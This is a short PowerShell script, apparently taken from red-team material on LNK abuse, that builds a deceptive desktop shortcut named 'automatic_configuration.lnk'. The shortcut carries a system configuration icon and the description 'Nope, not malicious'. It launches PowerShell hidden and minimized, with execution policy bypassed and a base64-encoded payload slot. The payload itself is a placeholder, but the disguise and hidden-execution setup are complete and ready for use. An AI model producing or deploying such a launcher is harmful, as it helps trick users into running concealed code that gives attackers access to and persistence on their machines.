# make a custom malicious shortcut

$path                      = "$([Environment]::GetFolderPath('Desktop'))\automatic_configuration.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "%SystemRoot%\System32\imageres.dll,63" # app config icon

$shortcut.TargetPath       = "powershell.exe"
$shortcut.Arguments        = "-nop -exec bypass -w hidden -enc 'BASE64PAYLOADHERE'"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "" # can set to some hotkey combo like CTRL+C
$shortcut.Description      = "Nope, not malicious"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

# source: https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
